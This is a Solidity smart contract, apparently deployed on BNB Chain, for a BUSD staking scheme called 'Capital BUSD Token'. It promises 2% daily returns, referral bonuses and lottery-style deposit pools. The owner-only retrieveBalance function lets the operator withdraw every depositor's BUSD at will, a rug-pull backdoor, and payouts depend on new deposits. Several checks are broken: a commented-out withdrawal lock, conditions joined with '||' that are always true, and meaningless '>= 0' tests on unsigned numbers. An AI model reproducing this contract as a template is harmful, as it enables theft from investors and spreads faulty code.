/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

library Address {
    
    function isContract(address account) internal view returns (bool) {
        return account.code.length > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {    
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function getOwner() external view returns (address);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract AutomatedBUSD is Context, Ownable, IERC20 {
    using SafeMath for uint256;
	using SafeERC20 for IERC20;
    
    uint8 private _decimals = 18;
    string private _symbol = "CBT";
    string private _name = "Capital BUSD Token ";
    uint256 private _totalSupply =  1000000000 * 10**18;
          
    uint256 constant project = 50;
    uint256 constant development = 50;
    uint256 constant hardDays = 1 days;
    uint256 constant refPercentage = 50;
    uint256 constant minInvest = 50 ether;
    uint256 constant percentDivider = 1000;
    uint256 constant maxRewards = 1000 ether;
    uint256 constant dailyPrc = 20;
    uint256 constant SELLRATE = 1000;
    uint256 constant POOLRATE = 10;

    uint256 private usersTotal;
    uint256 private compounds;
    uint256 private dateLaunched;
    uint256 private ovrTotalRefs;
    uint256 private ovrTotalDeps;
    uint256 private ovrTotalComp;
    uint256 private ovrTotalWiths;
    uint256 public withdrawInitialTimeStep = 14 days;
    
    uint256 private lastDepositTimeStep = 2 hours;
    uint256 private lastBuyCurrentRound = 1;
    uint256 private lastDepositPoolBalance;
    uint256 private lastDepositLastDrawAction;
    address private lastDepositPotentialWinner;

    address private previousPoolWinner;
    uint256 private previousPoolRewards;

    uint256 private topDepositTimeStep = 2 days;
    uint256 private topDepositCurrentRound = 1;
    uint256 private topDepositPoolBalance;
    uint256 private topDepositCurrentAmount;
    address private topDepositPotentialWinner;
    uint256 private topDepositLastDrawAction;

    address private previousTopDepositWinner;
    uint256 private previousTopDepositRewards;

    bool private initialized;
    bool private lastDepositEnabled;
    bool private topDepositEnabled;

    struct User {
        uint256 startDate;
        uint256 divs;
        uint256 refBonus;
        uint256 totalInvested;
        uint256 totalWithdrawn;
        uint256 totalCompounded;
        uint256 lastWith;
        uint256 timesCmpd;
        uint256 keyCounter;
        uint256 activeStakesCount;
        DepositList [] depoList;
    }

    struct DepositList {
        uint256 key;
        uint256 depoTime;
        uint256 amt;
        address ref;
        bool initialWithdrawn;
        uint256 requestTime;
        bool initialWithdrawRequest;
    }

    struct DivPercs{
        uint256 daysInSeconds;
        uint256 divsPercentage;
        uint256 feePercentage;
    }

    mapping (address => User) public users;
	mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
    event Reinvested(address indexed user, uint256 amount);
	event WithdrawnInitial(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 amount);
    event LastBuyPayout(uint256 indexed round, address indexed addr, uint256 amount, uint256 timestamp);
    event TopDepositPayout(uint256 indexed round, address indexed addr, uint256 amount, uint256 timestamp);

    address private dev; 
    address private proj;
    address private part;

    IERC20 private BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    constructor(address addr1, address addr2, address addr3) {
        dev = addr1;
        proj = addr2;
        part = addr3;
        _balances[address(this)] = 500000000 * 10**18; 
        _balances[proj] = 250000000 * 10**18; 	
        _balances[part] = 250000000 * 10**18;
        emit Transfer(address(0), address(this), _balances[address(this)]);  
        emit Transfer(address(0), proj, _balances[proj]);	
        emit Transfer(address(0), part, _balances[part]);
    }

    modifier isInitialized() {
        require(initialized, "Contract not initialized.");
        _;
    }
    
    function launch(address addr, uint256 amount) public onlyOwner {
        require(!initialized, "Contract already launched.");
        initialized = true;
        lastDepositEnabled = true;
        topDepositEnabled = true;
        lastDepositLastDrawAction = block.timestamp;
        topDepositLastDrawAction = block.timestamp;
        dateLaunched = block.timestamp;
        invest(addr, amount);
    }

    function invest(address ref, uint256 amount) public isInitialized {
        require(amount >= minInvest, "Minimum investment not reached.");
        
        BUSD.safeTransferFrom(msg.sender, address(this), amount);
        User storage user = users[msg.sender];

		uint256 tokens = amount.mul(POOLRATE);
        require(_balances[address(this)].sub(tokens) >= 0,"Not enough tokens!");        
        transferTokens(address(this), msg.sender, tokens);

        if (user.lastWith <= 0){
            user.lastWith = block.timestamp;
            user.startDate = block.timestamp;
        }
    
        uint256 refAmount = amount.mul(refPercentage).div(percentDivider);

        if(ref == msg.sender) ref = address(0);
        if (ref != 0x000000000000000000000000000000000000dEaD || ref != address(0)) {
            BUSD.safeTransfer(ref, refAmount); 
            users[ref].refBonus += refAmount;
            ovrTotalRefs += refAmount;
        }

        if(user.depoList.length == 0) usersTotal++;
        user.depoList.push(DepositList(user.depoList.length,  block.timestamp, amount, ref, false, 0, false));
        user.totalInvested += amount; 
        user.keyCounter++;
        user.activeStakesCount++;
        ovrTotalDeps += amount; 
        
        drawLastDepositWinner();
        poolLastDeposit(msg.sender, amount);
        
        drawTopDepositWinner();
        poolTopDeposit(msg.sender, amount);

        uint256 devStakeFee  = amount.mul(development).div(percentDivider); 
        uint256 projStakeFee = amount.mul(project).div(percentDivider);

        BUSD.safeTransfer(proj, devStakeFee);
        BUSD.safeTransfer(part, projStakeFee);

        emit RefBonus(ref, msg.sender, refAmount);
        emit NewDeposit(msg.sender, amount);
    }

    function poolLastDeposit(address userAddress, uint256 amount) private {
        if(!lastDepositEnabled) return;

        uint256 poolShare = amount.mul(10).div(percentDivider);

        lastDepositPoolBalance = lastDepositPoolBalance.add(poolShare) > maxRewards ? 
        lastDepositPoolBalance.add(maxRewards.sub(lastDepositPoolBalance)) : lastDepositPoolBalance.add(poolShare);
        lastDepositPotentialWinner = userAddress;
        lastDepositLastDrawAction  = block.timestamp;
    } 

    function drawLastDepositWinner() public {
        if(lastDepositEnabled && block.timestamp.sub(lastDepositLastDrawAction) >= lastDepositTimeStep && lastDepositPotentialWinner != address(0)) {
            
            uint256 projStakeFee = lastDepositPoolBalance.mul(project).div(percentDivider); 
            uint256 adjustedAmt  = lastDepositPoolBalance.sub(projStakeFee);
            
            BUSD.safeTransfer(lastDepositPotentialWinner, adjustedAmt); 

            emit LastBuyPayout(lastBuyCurrentRound, lastDepositPotentialWinner, adjustedAmt, block.timestamp);
            
            previousPoolWinner         = lastDepositPotentialWinner;
            previousPoolRewards        = adjustedAmt;
            lastDepositPoolBalance     = 0;
            lastDepositPotentialWinner = address(0);
            lastDepositLastDrawAction  = block.timestamp; 
            lastBuyCurrentRound++;
        }
    }

    function poolTopDeposit(address userAddress, uint256 amount) private {
        if(!topDepositEnabled) return;

        if(amount > topDepositCurrentAmount){
            topDepositCurrentAmount = amount;
            topDepositPoolBalance = topDepositCurrentAmount.mul(100).div(percentDivider);
            topDepositPotentialWinner = userAddress;
        }
    } 

    function drawTopDepositWinner() private {
        if(topDepositEnabled && block.timestamp.sub(topDepositLastDrawAction) >= topDepositTimeStep) {
            
            uint256 projFee = topDepositPoolBalance.mul(project).div(percentDivider); 
            uint256 adjustedAmt  = topDepositPoolBalance.sub(projFee);
            
            BUSD.safeTransfer(topDepositPotentialWinner, adjustedAmt); 

            emit TopDepositPayout(topDepositCurrentRound, topDepositPotentialWinner, adjustedAmt, block.timestamp);

            previousTopDepositWinner  = topDepositPotentialWinner;
            previousTopDepositRewards = adjustedAmt;
            topDepositPotentialWinner = address(0);
            topDepositCurrentAmount   = 0;
            topDepositPoolBalance     = 0;
            topDepositLastDrawAction  = block.timestamp;
            topDepositCurrentRound++;
        }
    }

  	function reinvest() public isInitialized {
        User storage user = users[msg.sender];

        uint256 y = getUserDividends(msg.sender);

        for (uint i = 0; i < user.depoList.length; i++){
          if (!user.depoList[i].initialWithdrawn) {
            user.depoList[i].depoTime = block.timestamp;
          }
        }

        user.depoList.push(DepositList(user.keyCounter,  block.timestamp, y, address(0), false, 0, false));  

        ovrTotalComp += y;
        user.totalCompounded += y;
        user.lastWith = block.timestamp;  
        user.keyCounter++;
        user.activeStakesCount++;
        compounds++;

	    emit Reinvested(msg.sender, user.refBonus);
    }

    function withdraw() public isInitialized returns (uint256 withdrawAmount) {
        User storage user = users[msg.sender];
        withdrawAmount = getUserDividends(msg.sender);
      
      	for (uint i = 0; i < user.depoList.length; i++) {
          if (!user.depoList[i].initialWithdrawn) {
            user.depoList[i].depoTime = block.timestamp;
          }
        }

        ovrTotalWiths += withdrawAmount;
        user.totalWithdrawn += withdrawAmount;
        user.lastWith = block.timestamp;

        BUSD.safeTransfer(msg.sender, withdrawAmount);

		emit Withdrawn(msg.sender, withdrawAmount);
    }
  
    function requestWithdrawInitial(uint256 key) public isInitialized {
        User storage user = users[msg.sender];

        if (user.depoList[key].initialWithdrawn) revert("This user stake is already forfeited.");  
        user.depoList[key].initialWithdrawRequest = true;
        user.depoList[key].requestTime = block.timestamp;
    }
  
    function withdrawInitial(uint256 key) public isInitialized {
        User storage user = users[msg.sender];
        //require(block.timestamp.sub(user.depoList[key].requestTime) >= withdrawInitialTimeStep, "Can only withdraw initial stake amount after the withdraw initial time step of request.");
        if (user.depoList[key].initialWithdrawn) revert("This user stake is already forfeited."); 
        uint256 amount = user.depoList[key].amt;
        //uint256 elapsedTime = user.depoList[key].requestTime.sub(user.depoList[key].depoTime);
        
        uint256 refundAmount = amount;
        ovrTotalDeps -= amount;
        ovrTotalWiths -= refundAmount;
        user.activeStakesCount--;
        user.totalInvested -= amount;
        user.depoList[key].amt = 0;
        user.depoList[key].initialWithdrawn = true;
        user.depoList[key].depoTime = block.timestamp;

        BUSD.safeTransfer(msg.sender, refundAmount);
		emit WithdrawnInitial(msg.sender, refundAmount);
    }

    function transferTokens(address from, address to, uint256 amount) private {
        _balances[to] = _balances[to].add(amount);
        _balances[from] = _balances[from].sub(amount);
    }

    function retrieveBalance() external onlyOwner {
       BUSD.safeTransfer(msg.sender, BUSD.balanceOf(address(this))); 
    }

    function sellTokens(uint256 amount) external {       
        User storage user = users[msg.sender];    
        require(_balances[msg.sender] - amount >= 0,"Not enough tokens!");

        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        _balances[address(this)] = _balances[address(this)].add(amount);
        emit Transfer(msg.sender, address(this), amount);
        
        uint256 cvtAmt = amount.div(SELLRATE); 
        uint256 devFee  = cvtAmt.mul(development).div(percentDivider); 
        uint256 projFee = cvtAmt.mul(project).div(percentDivider);

        ovrTotalWiths += cvtAmt;
        user.totalWithdrawn += cvtAmt;

        BUSD.safeTransfer(msg.sender, cvtAmt.sub(devFee.add(projFee)));
        BUSD.safeTransfer(dev, devFee);
        BUSD.safeTransfer(proj, projFee);
    }

    function getUserDividends(address addr) public view returns (uint256) {
        User storage user = users[addr];
        uint256 totalWithdrawable;     
        for (uint256 i = 0; i < user.depoList.length; i++){	
            uint256 elapsedTime = block.timestamp.sub(user.depoList[i].depoTime);
            uint256 amount = user.depoList[i].amt;
            if (user.depoList[i].initialWithdrawn || user.depoList[i].initialWithdrawRequest) continue;
            totalWithdrawable += (amount.mul(dailyPrc).div(percentDivider)).mul(elapsedTime).div(hardDays);
        }
        return totalWithdrawable;
    }
    
    function getUserAmountOfDeposits(address addr) view external returns(uint256) {
		return users[addr].depoList.length;
	}
    
    function getUserTotalDeposits(address addr) view external returns(uint256 amount) {
		for (uint256 i = 0; i < users[addr].depoList.length; i++) {
			amount = amount.add(users[addr].depoList[i].amt);
		}
	}

    function getUserDepositInfo(address userAddress, uint256 index) view external returns(uint256 depoKey, uint256 depositTime, uint256 amount, bool withdrawn, uint256 requestTime, bool requested) {
        depoKey = users[userAddress].depoList[index].key;
        depositTime = users[userAddress].depoList[index].depoTime;
		amount = users[userAddress].depoList[index].amt;
		withdrawn = users[userAddress].depoList[index].initialWithdrawn;
		requestTime = users[userAddress].depoList[index].requestTime;
		requested = users[userAddress].depoList[index].initialWithdrawRequest;
	}

    function getContractInfo() view external returns(uint256 totalUsers, uint256 launched, uint256 userCompounds, uint256 totalDeposited, uint256 totalCompounded, uint256 totalWithdrawn, uint256 totalReferrals) {
		totalUsers = usersTotal;
        launched = dateLaunched;
		userCompounds = compounds;
		totalDeposited = ovrTotalDeps;
		totalCompounded = ovrTotalComp;
		totalWithdrawn = ovrTotalWiths;
		totalReferrals = ovrTotalRefs;
	}
    
    function lastDepositInfo() view external returns(uint256 currentRound, uint256 currentBalance, uint256 currentStartTime, uint256 currentStep, address currentPotentialWinner, uint256 previousReward, address previousWinner) {
        currentRound           = lastBuyCurrentRound;
        currentBalance         = lastDepositPoolBalance;
        currentStartTime       = lastDepositLastDrawAction;  
        currentStep            = lastDepositTimeStep;    
        currentPotentialWinner = lastDepositPotentialWinner;
        previousReward         = previousPoolRewards;
        previousWinner         = previousPoolWinner;
    }

    function topDepositInfo() view external returns(uint256 topDepositRound, uint256 topDepositCurrentTopDeposit, address topDepositCurrentPotentialWinner, uint256 topDepositCurrentBalance, uint256 topDepositCurrentStartTime, uint256 topDepositCurrentStep, uint256 topDepositPreviousReward, address topDepositPreviousWinner) {
        topDepositRound                  = topDepositCurrentRound;
        topDepositCurrentTopDeposit      = topDepositCurrentAmount;
        topDepositCurrentPotentialWinner = topDepositPotentialWinner;
        topDepositCurrentBalance         = topDepositPoolBalance;
        topDepositCurrentStartTime       = topDepositLastDrawAction;
        topDepositCurrentStep            = topDepositTimeStep;
        topDepositPreviousReward         = previousTopDepositRewards;
        topDepositPreviousWinner         = previousTopDepositWinner;
    }

    function getUserInfo(address userAddress) view external returns(uint256 totalInvested, uint256 totalCompounded, uint256 totalWithdrawn, uint256 totalBonus, uint256 totalActiveStakes, uint256 totalStakesMade) {
		totalInvested = users[userAddress].totalInvested;
        totalCompounded = users[userAddress].totalCompounded;
        totalWithdrawn = users[userAddress].totalWithdrawn;
        totalBonus = users[userAddress].refBonus;
        totalActiveStakes = users[userAddress].activeStakesCount;
        totalStakesMade = users[userAddress].keyCounter;
	}

    function getBalance() view external returns(uint256){
         return BUSD.balanceOf(address(this));
    }

    function getOwner() external view returns (address) {
        return owner();
    }
    
    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
    }

    function drawFeatures() external onlyOwner {
        drawTopDepositWinner(); 
        drawLastDepositWinner();
    }

    function changeWithdrawInitialStepTime(uint256 timeStep) external onlyOwner {
        require(timeStep <= 14 days, "Time step can only changed to 1 day up to 30 days."); 
        withdrawInitialTimeStep = timeStep;
    }

    function changeLastDepositEventTime(uint256 timeStep) external onlyOwner {
        require(timeStep >= 1 hours || timeStep <= 1 days, "Time step can only changed to 1 hour up to 24 hours.");
        drawLastDepositWinner();   
        lastDepositTimeStep = timeStep;
    }
    
    function switchLastDepositEventStatus() external onlyOwner {
        drawLastDepositWinner();
        lastDepositEnabled = !lastDepositEnabled ? true : false;
        if(lastDepositEnabled) lastDepositLastDrawAction = block.timestamp;
    }

    function changeTopDepositEventTime(uint256 timeStep) external onlyOwner {
        require(timeStep >= 1 days || timeStep <= 7 days, "Time step can only changed to 1 day up to 7 days.");
        drawTopDepositWinner();   
        topDepositTimeStep = timeStep;
    }
    
    function switchTopDepositEventStatus() external onlyOwner isInitialized {
        drawTopDepositWinner();
        topDepositEnabled = !topDepositEnabled ? true : false;
        if(topDepositEnabled) topDepositLastDrawAction = block.timestamp;
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }
    
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}